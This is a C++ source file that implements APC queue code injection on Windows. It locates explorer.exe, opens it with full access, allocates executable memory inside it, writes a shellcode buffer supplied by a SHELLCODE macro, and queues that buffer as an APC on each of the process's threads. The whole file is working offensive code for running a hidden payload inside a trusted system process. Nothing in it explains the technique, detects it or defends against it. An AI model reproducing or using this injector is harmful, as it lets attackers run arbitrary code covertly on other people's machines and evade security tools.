#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "AsmCodes.h"

extern "C" {
	VOID ApcQueueCodeInjection();
}

VOID ApcQueueCodeInjection()
{
	unsigned char buf[] = SHELLCODE;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	HANDLE victimProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	SIZE_T shellSize = sizeof(buf);
	HANDLE threadHandle = NULL;

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(snapshot, &processEntry);
		}
	}

	victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	for (DWORD threadId : threadIds) {
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		Sleep(1000 * 2);
	}
}